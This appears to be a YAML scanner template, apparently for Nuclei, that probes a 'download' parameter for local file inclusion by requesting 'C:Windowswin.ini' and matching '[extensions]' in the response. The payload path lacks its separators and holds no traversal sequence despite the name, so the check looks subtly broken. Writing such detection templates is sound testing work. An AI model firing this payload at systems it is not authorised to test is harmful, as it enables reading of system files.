id: lfi7-419
name: 'Deep traversal in download'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via download'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      download:
        - 'C:Windowswin.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
